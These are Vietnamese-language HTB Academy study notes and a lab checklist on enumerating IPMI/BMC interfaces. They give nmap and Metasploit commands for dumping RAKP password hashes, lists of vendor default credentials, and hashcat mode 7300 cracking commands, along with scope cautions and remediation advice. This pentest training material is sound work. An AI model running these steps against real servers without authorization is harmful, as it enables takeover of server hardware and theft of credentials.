# IPMI Enumeration - HTB Academy

## Tổng quan

IPMI, viết tắt của Intelligent Platform Management Interface, là chuẩn quản trị phần cứng server từ xa.

IPMI hoạt động độc lập với BIOS, CPU, firmware và hệ điều hành. Vì vậy admin vẫn có thể quản trị server khi:

```text
OS chưa boot
OS bị treo
server đang powered off
không SSH/RDP được
```

IPMI thường được triển khai qua BMC.

## BMC là gì?

BMC, Baseboard Management Controller, là controller gắn trên motherboard server để quản trị phần cứng.

Nếu truy cập được BMC, mức độ nghiêm trọng rất cao vì gần tương đương physical access vào server.

Các BMC phổ biến:

```text
HP iLO
Dell iDRAC / DRAC
Supermicro IPMI
```

## Port mặc định

IPMI network protocol thường dùng:

```text
UDP/623
```

Cần scan UDP, không chỉ scan TCP.

## IPMI dùng để làm gì?

```text
Bật/tắt/reboot server
Truy cập remote console
Thay đổi BIOS settings
Mount ISO từ xa
Cài lại OS
Theo dõi nhiệt độ, quạt, nguồn
Xem hardware logs
Gửi alert qua SNMP
```

## Nmap Scan

```bash
sudo nmap -sU --script ipmi-version -p623 <IP>
```

Output cần chú ý:

```text
IPMI version
UserAuth
PassAuth
vendor/MAC
port state
```

Ví dụ:

```text
623/udp open asf-rmcp
Version: IPMI-2.0
```

## Metasploit IPMI Version Scan

```text
msfconsole
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS <IP>
run
```

Dùng để xác nhận IPMI version và authentication methods.

## Default Credentials

|Product|Username|Password|
|---|---|---|
|Dell iDRAC|`root`|`calvin`|
|HP iLO|`Administrator`|random 8 ký tự số + chữ hoa|
|Supermicro IPMI|`ADMIN`|`ADMIN`|

## IPMI 2.0 RAKP Hash Disclosure

IPMI 2.0 có điểm yếu trong RAKP authentication.

Trong quá trình xác thực, BMC có thể gửi salted SHA1/MD5 hash của password user hợp lệ cho client trước khi xác thực hoàn tất.

Attacker có thể lấy hash của user hợp lệ rồi crack offline.

## Dump IPMI Hash bằng Metasploit

```text
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <IP>
run
```

Có thể cấu hình output:

```text
set OUTPUT_HASHCAT_FILE ipmi_hashes.txt
set OUTPUT_JOHN_FILE ipmi_john.txt
```

Nếu tool crack được password phổ biến, output có thể báo:

```text
Hash for user 'ADMIN' matches password 'ADMIN'
```

## Crack bằng Hashcat

IPMI2 RAKP hash dùng mode:

```text
7300
```

Dictionary attack:

```bash
hashcat -m 7300 ipmi.txt /path/to/wordlist.txt
```

Mask attack cho HP iLO default password 8 ký tự gồm số và chữ hoa:

```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

## Tư duy pentest

```text
Scan UDP/623
-> xác nhận IPMI/BMC
-> fingerprint version/vendor
-> thử default credentials
-> dump RAKP hash nếu IPMI 2.0
-> crack offline bằng Hashcat mode 7300
-> thử password reuse cẩn thận trong scope
-> report vì BMC access gần như physical access
```

## Risk

Truy cập được BMC có thể dẫn đến:

```text
full hardware control
remote console access
OS reinstall
server shutdown/reboot
credential reuse
lateral movement
remote code execution trong một số trường hợp
```

---
# IPMI Lab Checklist

## 1. Xác định IPMI service

- [ ] Scan UDP port 623:

```bash
sudo nmap -sU -p623 <IP>
```
-  Scan với NSE script:
    
```
sudo nmap -sU --script ipmi-version -p623 <IP>
```

-  Ghi lại:
    
    -  IP target
        
    -  Port `623/udp`
        
    -  IPMI version
        
    -  Vendor/MAC nếu có
        
    -  UserAuth
        
    -  PassAuth
        
## 2. Xác nhận bằng Metasploit

```
msfconsole
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS <IP>
run
```

-  Xác nhận IPMI version.
    
-  Xác nhận authentication methods.
    
-  Ghi lại nếu là IPMI 2.0.
    
## 3. Thử default credentials

-  Dell iDRAC:
    
```
root:calvin
```

-  Supermicro IPMI:
    

```
ADMIN:ADMIN
```

-  HP iLO:
    

```
Administrator:<8 uppercase/digits random>
```

-  Nếu có web console, thử login trong scope cho phép.
    
-  Nếu có SSH/Telnet BMC, kiểm tra trong scope cho phép.
    
## 4. Dump IPMI hashes

```
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <IP>
run
```

-  Nếu muốn lưu hash cho Hashcat:
    
```
set OUTPUT_HASHCAT_FILE ipmi_hashes.txt
```

-  Nếu muốn lưu cho John:
    
```
set OUTPUT_JOHN_FILE ipmi_john.txt
```

-  Chạy module:
    
```
run
```

-  Ghi lại user/hash tìm được.
    

## 5. Crack offline

-  Xác định Hashcat mode:
    
```
IPMI2 RAKP = mode 7300
```

-  Dictionary attack:
    
```
hashcat -m 7300 ipmi_hashes.txt /path/to/wordlist.txt
```

-  HP iLO mask attack:
    
```
hashcat -m 7300 ipmi_hashes.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

## 6. Sau khi crack được password

-  Thử login BMC web console nếu trong scope.
    
-  Kiểm tra password reuse trên hệ thống khác nếu scope cho phép.
    
-  Không reboot/shutdown/mount ISO nếu không có yêu cầu rõ ràng.
    
-  Ghi lại impact:
    
    -  BMC access
        
    -  remote console
        
    -  power control
        
    -  potential OS reinstall
        
    -  lateral movement risk
        

## 7. Report

-  IPMI exposed trên mạng nội bộ.
    
-  Version IPMI.
    
-  Default credential có dùng được không.
    
-  Hash có dump được không.
    
-  Password có crack được không.
    
-  Credential có reuse không.
    
-  Khuyến nghị:
    
    -  đổi password mạnh và dài
        
    -  segment BMC network
        
    -  hạn chế truy cập UDP/623
        
    -  không expose BMC ra user VLAN
        
    -  monitor access logs